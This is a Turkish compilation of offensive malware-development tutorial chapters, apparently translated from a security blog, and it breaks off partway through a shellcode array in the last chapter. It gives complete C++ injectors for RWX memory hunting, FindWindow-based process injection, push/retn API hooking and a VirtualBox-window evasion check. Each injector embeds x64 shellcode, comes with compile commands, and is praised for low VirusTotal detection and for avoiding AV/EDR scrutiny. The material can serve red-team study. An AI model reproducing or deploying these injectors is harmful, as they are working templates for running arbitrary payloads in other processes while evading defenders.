28. RWX Bellek Avcılığı ile Süreç Enjeksiyonu. Basit C++ Örneği.

﷽

+++++++++++++++++++++++++++++
Bu, başka bir süreç enjeksiyonu tekniği üzerine yapılan bir araştırmadır. 

RWX Bellek Avcılığı

Hadi, klasik kod enjeksiyonu zararlı yazılımımızın mantığına bakalım:
//...
// allocate memory buffer for remote process
rb = VirtualAllocEx(ph, NULL, my_payload_len,
(MEM_RESERVE | MEM_COMMIT),
PAGE_EXECUTE_READWRITE);

// "copy" data between processes
WriteProcessMemory(ph, rb, my_payload,
sizeof(my_payload), NULL);

// our process start new thread
rt = CreateRemoteThread(ph, NULL, 0,
(LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
//...

Hatırlayacağınız gibi, `VirtualAllocEx` işlevini kullanıyoruz. Bu işlev, uzak bir süreç için bellek tamponu ayırmamıza olanak tanır. Ardından, `WriteProcessMemory`, süreçler arasında veri kopyalamamıza izin verir. Ve `CreateRemoteThread`, yeni iş parçacığının hangi süreçte başlatılacağını belirlememize olanak tanır.  

Başka bir yol var mı? Evet, sistemde çalışan hedef süreçleri numaralandırmak, tahsis edilen bellek bloklarını aramak ve herhangi birinin RWX korumasıyla korunduğunu kontrol etmek mümkündür.Bu, bu bloklarda okuma/yazma/çalıştırma işlemlerine girişmeyi sağlayabilir ve bazı AV/EDR çözümlerinden kaçınmaya yardımcı olabilir.

Pratik Örnek

Bu tekniğin akışı basittir, hadi mantığını inceleyelim:  

Sistemdeki tüm süreçler arasında döngü oluşturun:  
+++++++++++++++++++++++++++++

Her bir süreçte tahsis edilen tüm bellek blokları arasında döngü oluşturun: 
+++++++++++++++++++++++++++++

Daha sonra, RWX korumasıyla korunan bir bellek bloğunu kontrol edin: 
+++++++++++++++++++++++++++++

Eğer uygun, bellek bloğunu yazdırın (gösterim için ): 
+++++++++++++++++++++++++++++

Payload'umuzu bu bellek bloğuna yazın:  
+++++++++++++++++++++++++++++

Ardından, yeni bir uzak iş parçacığı başlatın:
+++++++++++++++++++++++++++++

Tam C++ kaynak kodu zararlı yazılımımızın şu şekildedir:
/*
hack.cpp
process injection technique via
RWX memory hunting
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/02/01/malware-injection-16.html
*/
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main(int argc, char* argv[]) {

	MEMORY_BASIC_INFORMATION m;
	PROCESSENTRY32 pe;
	LPVOID address = 0;
	HANDLE ph;
	HANDLE hSnapshot;
	BOOL hResult;
	pe.dwSize = sizeof(PROCESSENTRY32);

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return-1;
	hResult = Process32First(hSnapshot, &pe);
	while (hResult) {
		ph = OpenProcess(MAXIMUM_ALLOWED, false, pe.th32ProcessID);
		if (ph) {
			printf("hunting in %s\n", pe.szExeFile);
			while (VirtualQueryEx(ph, address, &m, sizeof(m))) {
				address = (LPVOID)(
				(DWORD_PTR)m.BaseAddress + m.RegionSize);
				if (m.AllocationProtect == PAGE_EXECUTE_READWRITE) {
					printf("rwx memory successfully found at 0x%x :)\n"
					,
					m.BaseAddress);
					WriteProcessMemory(ph, m.BaseAddress,
					my_payload, sizeof(my_payload), NULL);
					CreateRemoteThread(ph, NULL, NULL,
					(LPTHREAD_START_ROUTINE)m.BaseAddress,
					NULL, NULL, NULL);
					break;
				}
			}
			address = 0;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}
	CloseHandle(hSnapshot);
	CloseHandle(ph);
	return 0;
}
Her zamanki gibi, basitlik adına, payload olarak meow-meow mesaj kutusunu kullandım:

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
Demo
Her şeyi eylemde görelim.Bizim pratilk örneğimizi derleyelim:

x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive


++++++++++++++++++++++++++++++++++++++++=
Sonra çalıştırın! Bizim durumumuzda, kurban makine Windows 10 x64:
++++++++++++++++++++++++++++++++++++++++=

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı! :)

Hadi kurban süreçlerimizden birini kontrol edelim, örneğin OneDrive: 

++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++=

Bir sorun var. Aşağıda verilen kod, kaba bir kavram kanıtıdır (proof-of-concept) ve bazı süreçlerin çökmesine neden olabilir.Örneğin, benim durumumda `SearchUI.exe` çöktü ve örneğimi çalıştırdıktan sonra artık çalışmıyordu.

Şimdi zararlı yazılımımızı VirusTotal'a yükleyelim:  

++++++++++++++++++++++++++++++++++++++++=
https://www.virustotal.com/gui/file/5835847d11b7f891e70681e2ec3a1e22013fa3ff
e31a36429e7814a3be40bd97/detection

Sonuç olarak, 69 antivirüs motorundan 7 tanesi dosyamızı zararlı olarak algıladı. 
`Moneta64.exe` sonucu:

++++++++++++++++++++++++++++++++++++++++=

Bu tekniği cephaneliğinizde bulundurmanın iyi bir nedeni, payload'unuzu kopyalamak için yeni RWX belleği tahsis etmenizi gerektirmemesidir. Bu işlem, `VirtualAllocEx` gibi daha popüler ve şüpheli bir yöntemden kaçınmanızı sağlar. `VirtualAllocEx`, mavi takım üyeleri tarafından daha sık araştırılmaktadır.

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.  

VirtualQueryEx(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex)
CreateToolhelp32Snapshot(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
Process32First(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)
Process32Next(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)
OpenProcess(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
Taking a snapshot and viewing processes(https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes)
WriteProcessMemory(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
CreateRemoteThread(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
Hunting memory(https://www.elastic.co/blog/hunting-memory)
Moneta64.exe(https://github.com/forrest-orr/moneta)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-02-01-malware-injection-16



29. Windows API Hooking Bölüm 2. Basit C++ Örneği

﷽
++++++++++++++++++++++++++++++++++++++++=


API Hooking Nedir?

API hooking, API çağrılarının davranışını ve akışını enstrüman etmek ve değiştirmek için kullanılan bir tekniktir. Bu teknik, zararlı kodun algılanıp algılanmadığını belirlemek için birçok antivirüs çözümü tarafından da kullanılır.

Hooking'in en kolay yolu, bir atlama (jump) talimatı eklemektir. Bu bölümde, başka bir tekniği göstereceğim.

Bu yöntem toplamda altı bayttan oluşur ve şu şekilde görünür:  
Push talimatı, bir 32-bit değeri yığına iter ve retn talimatı, yığının tepesindeki 32-bit adresi Instruction Pointer’a (Komut İşaretçisine) çıkarır (başka bir deyişle, yığının en üstünde bulunan adreste yürütmeyi başlatır).

Örnek 1

Bir örneğe bakalım. Bu durumda, kernel32.dll içindeki WinExec işlevini hooklayabilirim (`hooking.cpp`):
/*
hooking.cpp
basic hooking example with push/retn method
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/03/08/basic-hooking-2.html
*/
#include <windows.h>

// buffer for saving original bytes
char originalBytes[6];
FARPROC hookedAddress;

// we will jump to after the hook has been installed
int __stdcall myFunc(LPCSTR lpCmdLine, UINT uCmdShow) {
	WriteProcessMemory(GetCurrentProcess(),
	(LPVOID)hookedAddress, originalBytes, 6, NULL);
	return WinExec("mspaint", uCmdShow);
}

// hooking logic
void setMySuperHook() {
	HINSTANCE hLib;
	VOID *myFuncAddress;
	DWORD *rOffset;
	DWORD *hookAddress;
	DWORD src;
	DWORD dst;
	CHAR patch[6]= {0};

	// get memory address of function WinExec
	hLib = LoadLibraryA("kernel32.dll");
	hookedAddress = GetProcAddress(hLib, "WinExec");

	// save the first 6 bytes into originalBytes (buffer)
	ReadProcessMemory(GetCurrentProcess(),
	(LPCVOID) hookedAddress,
	originalBytes, 6, NULL);

	// overwrite the first 6 bytes with a jump to myFunc
	myFuncAddress = &myFunc;
	// create a patch "push <addr>, retn"
	memcpy_s(patch, 1,
	"\x68"
	, 1); // 0x68 opcode for push
	memcpy_s(patch + 1, 4, &myFuncAddress, 4);
	memcpy_s(patch + 5, 1,
	"\xC3"
	, 1); // opcode for retn
	WriteProcessMemory(GetCurrentProcess(),
	(LPVOID)hookedAddress, patch, 6, NULL);
}
int main() {
	// call original
	WinExec("notepad", SW_SHOWDEFAULT);
	// install hook
	setMySuperHook();
	// call after install hook
	WinExec("notepad", SW_SHOWDEFAULT);
}

Gördüğünüz gibi, kaynak kod ilk bölümdeki hooking örneğiyle aynıdır. Tek fark şudur:
++++++++++++++++++++++++++++++++++++++++=

Bu, aşağıdaki assembly talimatlarına çevrilecektir:
// push myFunc memory address onto the stack
push myFunc

// jump to myFunc
Return
Haydi,şunu bir derleyelim:
i686-w64-mingw32-g++ -O2 hooking.cpp -o hooking.exe \
-mconsole -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive >/dev/null 2>&1

++++++++++++++++++++++++++++++++++++++++=

Ve Windows 7 x64’te çalıştıralım:
.\hooking.exe

++++++++++++++++++++++++++++++++++++++++=

Gördüğünüz gibi her şey mükemmel çalışıyor :)

x86 API Hooking Demystified(http://jbremer.org/x86-api-hooking-demystified/)
WinExec(https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-03-08-basic-hooking-2

30. FindWindow ile Süreç Enjeksiyonu. Basit C++ Örneği.

﷽

+++++++++++++++++++++++++++++++++

Bu yazı, Win32 API işlevlerinden biri üzerine yaptığım araştırmaların bir sonucudur.

Önceki yazılarımdan birinde, enjeksiyon aracım için bir süreci isimle nasıl bulacağımı yazmıştım. 

Süreç veya DLL enjeksiyonu yazarken, sistemde çalışan tüm pencereleri bulmak ve örneğin yönetici tarafından başlatılan bir sürece enjekte etmeye çalışmak güzel olabilir.
  
En basit durumda, kurbanımız olacak bir sürecin herhangi bir penceresini bulabiliriz.

Pratik Örnek

Bu tekniğin akışı basittir. Kaynak kodu inceleyelim:

/*
* hack.cpp - classic process injection
* via FindWindow. C++ implementation
* @cocomelonc
* https://cocomelonc.github.io/tutorial/
2022/03/08/malware-injection-17.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main() {
	HANDLE ph;
	HANDLE rt;
	DWORD pid;

	// find a window for mspaint.exe
	HWND hw = FindWindow(NULL, (LPCSTR) "Untitled - Paint");
	if (hw == NULL) {
		printf("failed to find window :(\n");
		return-2;
	}
	GetWindowThreadProcessId(hw, &pid);
	ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	LPVOID rb = VirtualAllocEx(ph, NULL,
	sizeof(my_payload),
	MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(ph, rb, my_payload,
	sizeof(my_payload), NULL);
	rt = CreateRemoteThread(ph, NULL, 0,
	(LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
	CloseHandle(ph);
	return 0;
}

Her zamanki gibi, basitlik adına, payload olarak meow-meow mesaj kutusunu kullandım:

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
Gördüğünüz gibi,ana mantık burda:

//...
// find a window for mspaint.exe
HWND hw = FindWindow(NULL, (LPCSTR) "Untitled - Paint");
if (hw == NULL) {
	printf("failed to find window :(\n");
	return-2;
}
GetWindowThreadProcessId(hw, &pid);
ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
//...

DEMO

Haydi derleyelim:

x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++

Ve çalıştıralım:

.\hack.exe 1304

+++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++

Gördüğünüz gibi,her şey mükemmel çalışıyor:

Anti-VM
Bu işlevin başka bir kullanım örneği, sanal makine (VM) 'kaçınması'dır. Bazı pencere adlarının yalnızca sanal bir ortamda mevcut olması ve normal ana bilgisayar işletim sisteminde olmaması gerçeği buna dayanır.
Bir örneğe bakalım:
/*
* hack.cpp - VM evasion via FindWindow. C++ implementation
* @cocomelonc
* https://cocomelonc.github.io/tutorial/
2022/03/08/malware-injection-17.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main(int argc, char* argv[]) {
	HANDLE ph;
	HANDLE rt;
	DWORD pid;

	// find a window with certain class name
	HWND hcl = FindWindow((LPCSTR) L"VBoxTrayToolWndClass", NULL);
	HWND hw = FindWindow(NULL, (LPCSTR) L"VBoxTrayToolWnd");
	if (hcl || hw) {
		pid = atoi(argv[1]);
		ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		LPVOID rb = VirtualAllocEx(ph, NULL, sizeof(my_payload),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(ph, rb, my_payload,
		sizeof(my_payload), NULL);
		rt = CreateRemoteThread(ph, NULL, 0,
		(LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
		CloseHandle(ph);
		return 0;
	} else {
		printf("virtualbox VM detected :(");
	return-2;
	}
}

Gördüğünüz gibi, yalnızca aşağıdaki sınıf adlarına sahip pencerelerin işletim sisteminde mevcut olup olmadığını kontrol ediyoruz:
VBoxTrayToolWndClass
VBoxTrayToolWnd
Hadi derleyelim:
x86_64-w64-mingw32-g++ hack2.cpp -o hack2.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++


Ve çalıştıralım:

.\hack2.exe 1304

+++++++++++++++++++++++++++++++++

Her şey VirtualBox Windows 10 x64 için mükemmel bir şekilde çalışıyor.
Şimdi hack2.exe dosyamızı VirusTotal'a yükleyelim:
+++++++++++++++++++++++++++++++++

Sonuç olarak, 66 antivirüs motorundan 4 tanesi dosyamızı zararlı olarak algıladı.
https://www.virustotal.com/gui/file/dd340e3de34a8bd76c8693832f9a665b47e98fce
58bf8d2413f2173182375787/detection 
Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.
FindWindow(https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-findwindowa)
Evasions UI artifacts(https://evasions.checkpoint.com/techniques/ui-artifacts.html)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-03-14-malware-injection-17


31. Zararlı Yazılım Geliştirme Tüyoları. Kernel32.dll Tabanını Bulma: ASM Tarzı. C++ Örneği.
﷽
++++++++++++++++++++++++++++++++
Bu bölüm, gerçek hayattaki zararlı yazılımlarda kullanılan ilginç bir numara üzerine yaptığım kendi araştırmaların bir sonucudur.
Yazılarımdan birinde, GetModuleHandle kullanımından bahsetmiştim. Bu işlev, belirtilen bir DLL'in bir tanıtıcısını döndürür. Örneğin:
#include <windows.h>
LPVOID (WINAPI * pVirtualAlloc)(
LPVOID lpAddress, SIZE_T dwSize,
DWORD flAllocationType, DWORD flProtect);

//...

int main() {
	DWORD oldprotect = 0;
	HMODULE hk32 = GetModuleHandle("kernel32.dll");
	pVirtualAlloc = GetProcAddress(hk32, "VirtualAlloc");
//...

return 0;
}
Daha sonra, shellcode'u yürütmenin asıl yolu aşağıdaki gibi bir şeydir (meow.cpp):
#include <windows.h>

LPVOID (WINAPI * pVirtualAlloc)(
LPVOID lpAddress, SIZE_T dwSize,
DWORD flAllocationType, DWORD flProtect);

unsigned char my_payload[] =
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
